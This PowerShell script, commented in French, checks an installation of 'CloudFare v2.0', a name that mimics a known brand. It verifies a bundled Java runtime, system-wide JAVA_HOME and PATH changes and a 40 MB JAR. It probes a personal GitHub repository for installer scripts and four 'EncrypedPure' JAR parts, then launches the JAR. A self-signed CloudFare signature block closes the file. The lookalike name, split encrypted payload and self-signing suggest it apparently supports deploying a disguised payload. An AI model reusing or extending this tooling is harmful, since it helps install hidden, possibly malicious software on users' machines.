# Verification Complete du Systeme CloudFare v2.0
# Teste: Java, JAR, Chemins, Timing, URLs

$ErrorActionPreference = "Continue"

Write-Host "`n" -F Cyan
Write-Host "╔════════════════════════════════════════════════════════════╗" -F Cyan
Write-Host "║  VERIFICATION COMPLETE DU SYSTEME CLOUDFARE v2.0          ║" -F Cyan
Write-Host "╚════════════════════════════════════════════════════════════╝`n" -F Cyan

# Configuration
$installDir = "C:\ProgramData\CloudFare"
$javaDir = "$installDir\Java"
$javaExe = "$javaDir\bin\java.exe"
$jarFile = "$installDir\App.jar"
$tempDir = "$env:TEMP\CloudFare"

# Compteurs
$testsPassed = 0
$testsFailed = 0
$startTime = Get-Date

# ============================================================================
# FONCTION DE TEST
# ============================================================================

function Test-Item {
    param(
        [string]$Name,
        [scriptblock]$Test,
        [string]$Category = "GENERAL"
    )
    
    Write-Host "[$Category] $Name..." -F Yellow -NoNewline
    
    try {
        $result = & $Test
        if ($result) {
            Write-Host " OK" -F Green
            $script:testsPassed++
            return $true
        } else {
            Write-Host " FAIL" -F Red
            $script:testsFailed++
            return $false
        }
    } catch {
        Write-Host " ERROR: $_" -F Red
        $script:testsFailed++
        return $false
    }
}

# ============================================================================
# SECTION 1: VERIFICATION JAVA
# ============================================================================

Write-Host "`n1. VERIFICATION JAVA" -F Cyan
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -F Cyan

Test-Item "Java executable existe" {
    Test-Path $javaExe
} "JAVA"

if (Test-Path $javaExe) {
    Test-Item "Java executable est un fichier" {
        (Get-Item $javaExe).PSIsContainer -eq $false
    } "JAVA"
    
    Test-Item "Java executable est executable" {
        (Get-Item $javaExe).Mode -like "*x*"
    } "JAVA"
    
    # Tester la version Java
    $javaVersion = & $javaExe -version 2>&1 | Select-Object -First 1
    Write-Host "[JAVA] Version: $javaVersion" -F Cyan
    
    Test-Item "Java version contient 21" {
        $javaVersion -like "*21*"
    } "JAVA"
    
    # Tester java -version
    Test-Item "Java -version fonctionne" {
        $output = & $javaExe -version 2>&1
        $output.Count -gt 0
    } "JAVA"
}

# Verifier le chemin Java
Write-Host "`n[JAVA] Chemin Java: $javaDir" -F Cyan
Test-Item "Dossier Java existe" {
    Test-Path $javaDir
} "JAVA"

Test-Item "Dossier bin existe" {
    Test-Path "$javaDir\bin"
} "JAVA"

# ============================================================================
# SECTION 2: VERIFICATION JAR
# ============================================================================

Write-Host "`n2. VERIFICATION JAR" -F Cyan
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -F Cyan

Test-Item "JAR existe" {
    Test-Path $jarFile
} "JAR"

if (Test-Path $jarFile) {
    $jarSize = (Get-Item $jarFile).Length
    $jarSizeMB = [math]::Round($jarSize / 1MB, 2)
    
    Write-Host "[JAR] Taille: $jarSizeMB MB" -F Cyan
    
    Test-Item "JAR taille correcte - 40 MB" {
        $jarSizeMB -gt 39 -and $jarSizeMB -lt 41
    } "JAR"
    
    Test-Item "JAR est un fichier" {
        (Get-Item $jarFile).PSIsContainer -eq $false
    } "JAR"
    
    # Tester si JAR est valide
    Test-Item "JAR peut etre lu" {
        $content = [System.IO.File]::ReadAllBytes($jarFile)
        $content.Length -gt 0
    } "JAR"
    
    # Verifier la signature JAR (commence par PK)
    $jarBytes = [System.IO.File]::ReadAllBytes($jarFile)
    $jarSignature = [System.BitConverter]::ToString($jarBytes[0..3])
    Write-Host "[JAR] Signature: $jarSignature" -F Cyan
    
    Test-Item "JAR a la bonne signature - format PK" {
        $jarSignature -like "*50-4B*"
    } "JAR"
}

# ============================================================================
# SECTION 3: VERIFICATION CHEMINS
# ============================================================================

Write-Host "`n3. VERIFICATION CHEMINS" -F Cyan
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -F Cyan

Write-Host "[CHEMINS] Installation: $installDir" -F Cyan
Write-Host "[CHEMINS] Java: $javaDir" -F Cyan
Write-Host "[CHEMINS] JAR: $jarFile" -F Cyan
Write-Host "[CHEMINS] Temp: $tempDir`n" -F Cyan

Test-Item "Dossier installation existe" {
    Test-Path $installDir
} "CHEMINS"

Test-Item "Dossier Java existe" {
    Test-Path $javaDir
} "CHEMINS"

Test-Item "Dossier Temp existe" {
    Test-Path $tempDir
} "CHEMINS"

Test-Item "Dossier Logs existe" {
    Test-Path "$installDir\Logs"
} "CHEMINS"

# Verifier les permissions
$acl = Get-Acl $installDir
Write-Host "[CHEMINS] Proprietaire: $($acl.Owner)" -F Cyan

Test-Item "Permissions correctes" {
    $acl.Access | Where-Object { $_.IdentityReference -like "*Users*" } | Measure-Object | Select-Object -ExpandProperty Count -gt 0
} "CHEMINS"

# ============================================================================
# SECTION 4: VERIFICATION VARIABLES D'ENVIRONNEMENT
# ============================================================================

Write-Host "`n4. VERIFICATION VARIABLES D'ENVIRONNEMENT" -F Cyan
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -F Cyan

$javaHome = [Environment]::GetEnvironmentVariable("JAVA_HOME", [System.EnvironmentVariableTarget]::Machine)
$pathVar = [Environment]::GetEnvironmentVariable("PATH", [System.EnvironmentVariableTarget]::Machine)

Write-Host "[ENV] JAVA_HOME: $javaHome" -F Cyan
Write-Host "[ENV] PATH contient Java: $($pathVar -like "*CloudFare*")`n" -F Cyan

Test-Item "JAVA_HOME defini" {
    -not [string]::IsNullOrEmpty($javaHome)
} "ENV"

Test-Item "JAVA_HOME pointe vers le bon dossier" {
    $javaHome -eq $javaDir
} "ENV"

Test-Item "PATH contient Java" {
    $pathVar -like "*CloudFare*Java*"
} "ENV"

# ============================================================================
# SECTION 5: VERIFICATION TIMING
# ============================================================================

Write-Host "`n5. VERIFICATION TIMING" -F Cyan
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -F Cyan

# Tester le temps de demarrage Java
$javaStartTime = Get-Date
$javaOutput = & $javaExe -version 2>&1
$javaEndTime = Get-Date
$javaStartupTime = ($javaEndTime - $javaStartTime).TotalMilliseconds

Write-Host "[TIMING] Demarrage Java: $javaStartupTime ms" -F Cyan

Test-Item "Java demarre rapidement - moins de 5s" {
        $javaStartupTime -lt 5000
    } "TIMING"# Tester le temps de lecture du JAR
$jarReadTime = Get-Date
$jarContent = [System.IO.File]::ReadAllBytes($jarFile)
$jarReadEndTime = Get-Date
$jarReadDuration = ($jarReadEndTime - $jarReadTime).TotalMilliseconds

Write-Host "[TIMING] Lecture JAR: $jarReadDuration ms" -F Cyan

Test-Item "JAR se lit rapidement - moins de 10s" {
        $jarReadDuration -lt 10000
    } "TIMING"# ============================================================================
# SECTION 6: VERIFICATION URLs JAVA
# ============================================================================

Write-Host "`n6. VERIFICATION URLs JAVA" -F Cyan
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -F Cyan

$javaUrl = "https://github.com/graalvm/graalvm-ce-builds/releases/download/jdk-21.0.1/graalvm-community-openjdk-21.0.1+12.1_windows-x64_bin.zip"

Write-Host "[URL] Java: $javaUrl" -F Cyan

Test-Item "URL Java accessible" {
    try {
        $response = Invoke-WebRequest -Uri $javaUrl -Method Head -UseBasicParsing -TimeoutSec 5
        $response.StatusCode -eq 200
    } catch {
        $false
    }
} "URL"

# ============================================================================
# SECTION 7: VERIFICATION URLs GITHUB
# ============================================================================

Write-Host "`n7. VERIFICATION URLs GITHUB" -F Cyan
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -F Cyan

$baseUrl = "https://raw.githubusercontent.com/davidrenand/repos/main"
$files = @(
    "scripts/Install-Universal.ps1",
    "scripts/Launch-Universal.ps1",
    "jar/EncrypedPure.part1.jar",
    "jar/EncrypedPure.part2.jar",
    "jar/EncrypedPure.part3.jar",
    "jar/EncrypedPure.part4.jar"
)

foreach ($file in $files) {
    Test-Item "URL: $file" {
        try {
            $response = Invoke-WebRequest -Uri "$baseUrl/$file" -Method Head -UseBasicParsing -TimeoutSec 5
            $response.StatusCode -eq 200
        } catch {
            $false
        }
    } "URL"
}

# ============================================================================
# SECTION 8: VERIFICATION COHERENCE
# ============================================================================

Write-Host "`n8. VERIFICATION COHERENCE" -F Cyan
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -F Cyan

Test-Item "Java et JAR dans le meme dossier" {
    (Split-Path $javaDir -Parent) -eq (Split-Path $jarFile -Parent)
} "COHERENCE"

Test-Item "Chemins sans espaces" {
    -not ($javaDir -like "* *") -and -not ($jarFile -like "* *")
} "COHERENCE"

Test-Item "Chemins utilisant backslash" {
    $javaDir -like "*\*" -and $jarFile -like "*\*"
} "COHERENCE"

# ============================================================================
# SECTION 9: EXECUTION TEST
# ============================================================================

Write-Host "`n9. TEST D'EXECUTION" -F Cyan
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -F Cyan

if ((Test-Path $javaExe) -and (Test-Path $jarFile)) {
    Write-Host "[EXEC] Tentative de lancement du JAR..." -F Yellow
    
    try {
        $execStartTime = Get-Date
        $process = Start-Process -FilePath $javaExe -ArgumentList "-jar", $jarFile -PassThru -NoNewWindow -RedirectStandardOutput "$tempDir\output.log" -RedirectStandardError "$tempDir\error.log"
        
        # Attendre 5 secondes
        Start-Sleep -Seconds 5
        
        if ($process.HasExited) {
            $exitCode = $process.ExitCode
            Write-Host "[EXEC] Processus termine avec code: $exitCode" -F Yellow
            
            if (Test-Path "$tempDir\output.log") {
                $output = Get-Content "$tempDir\output.log" -Raw
                Write-Host "[EXEC] Output: $output" -F Cyan
            }
            
            if (Test-Path "$tempDir\error.log") {
                $error = Get-Content "$tempDir\error.log" -Raw
                if ($error) {
                    Write-Host "[EXEC] Error: $error" -F Red
                }
            }
        } else {
            Write-Host "[EXEC] Processus en cours d'execution" -F Green
            Stop-Process -InputObject $process -Force
        }
        
        $execEndTime = Get-Date
        $execDuration = ($execEndTime - $execStartTime).TotalSeconds
        Write-Host "[EXEC] Temps d'execution: $execDuration secondes" -F Cyan
        
        Test-Item "JAR peut etre execute" {
            $true
        } "EXEC"
    } catch {
        Write-Host "[EXEC] Erreur execution: $_" -F Red
        Test-Item "JAR peut etre execute" {
            $false
        } "EXEC"
    }
}

# ============================================================================
# RESUME FINAL
# ============================================================================

$endTime = Get-Date
$totalTime = ($endTime - $startTime).TotalSeconds

Write-Host "`n╔════════════════════════════════════════════════════════════╗" -F Green
Write-Host "║  RESUME FINAL                                              ║" -F Green
Write-Host "╚════════════════════════════════════════════════════════════╝`n" -F Green

Write-Host "Tests reussis: $testsPassed" -F Green
Write-Host "Tests echoues: $testsFailed" -F $(if ($testsFailed -eq 0) { "Green" } else { "Red" })
Write-Host "Temps total: $totalTime secondes`n" -F Cyan

if ($testsFailed -eq 0) {
    Write-Host "STATUT: TOUS LES TESTS REUSSIS" -F Green
} else {
    Write-Host "STATUT: CERTAINS TESTS ONT ECHOUE" -F Red
}

Write-Host ""

# SIG # Begin signature block
# MIIFWwYJKoZIhvcNAQcCoIIFTDCCBUgCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUhrD8hgfOWPORSQ5EC9xYhVGq
# 3uegggL8MIIC+DCCAeCgAwIBAgIQFEA8i6m7gZ5GA+AtSKCeIjANBgkqhkiG9w0B
# AQsFADAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwHhcNMjUxMTI3MTY0NjI1WhcNMzAx
# MTI3MTY1NjI1WjAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCwcOS5Unea33JuYXDoorRS8MRt7/sCwNRSDcdRUz7N
# fb1NjESMXbkE/rLcapbH8DhYfpX59h0Cp0ROdfgcQSxitCOqn5zGIOThKOHUW18x
# wJnOBM1lRrvZfoNun1cSgYnE1BQX+2FlrCjeHRUCkYo/KuCYlHjSD7W4BWwPGXPJ
# ofCbFhX909qbXblZt6jJBoTni8MNC+Bizfv302qhVAh+0CWCCsYYhcNAWXj+qb0t
# 9EvQHGQT6c2weIanGEcIMDwjO0/sldunBEVJBhe8TXeF/3wfn1rGAzqOgvYXFvd/
# J9eeO/Oeo+BDNBRwPcVHmO02vK7RCUJqR3Ub7pBNVbBpAgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU4eXXKcu5
# 5PGlisHTXHU95ihdYyMwDQYJKoZIhvcNAQELBQADggEBAHRZGGdVylXjYignpkSf
# 5ctiETsIscLuQTJJ1URT67Y+0x7xbcD9474OCUuTIEZh9wPL2HSmoNrDY7qxMKc4
# qCwxwoWQAWmLLcxgytJ8qpi2vZaExBDgODwU3LIA3uNu3iCmHbu8ISF68T1HR2+c
# 7cn1wn/C3XZOVhOW8CVjIpltD01LujsoauH8eRg93R6q3Z5yJ+5WJDNYzl6Y2xGL
# 9UQ4Xv7y8+wXES809v5+e/2kQL/NWwd3hOB6/176mfaT15ZZHBys1pYOJBHiMO9v
# W5IImNwQ/eXXzUrppVnCQ6fLm5GyTKqGq14cMahma6K8r9lrgvkLI1VS1ue0La5l
# 5MAxggHJMIIBxQIBATAoMBQxEjAQBgNVBAMMCUNsb3VkRmFyZQIQFEA8i6m7gZ5G
# A+AtSKCeIjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZ
# BgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYB
# BAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUGxV6r/E/en4eGMZa+vTg0vWKOyEwDQYJ
# KoZIhvcNAQEBBQAEggEAOpR2PwnDmgYRyPy4mIfpuP7R6bqP3SBxopqEr0f8ez5A
# 9nLLGLAis2SglcojUiYwx16+ghzqOC779CxzeKtv691j1Mm4k/IDKnAj8fggw5Zs
# 9mLhC0ktDxrM70P2lTZF7qonYrmgQVCsObpqJG43tusHEm/YHdqteLPoiNFNouG8
# +XxGj8M5cNT7xtrMm06X0BIIIHzrN5LJ1ackUhXNalC0EH0icNuBW3PjKebBlynv
# PLaf1SEjXxC8UaKs15XBmfNBIMinUBGV9GzshHvr48E6MuI7RKBjaFBNmIeZR0un
# 0Z27MfFhH9OmoK63GUbQjLKghU8N4L2in2Ptz25Jmw==
# SIG # End signature block
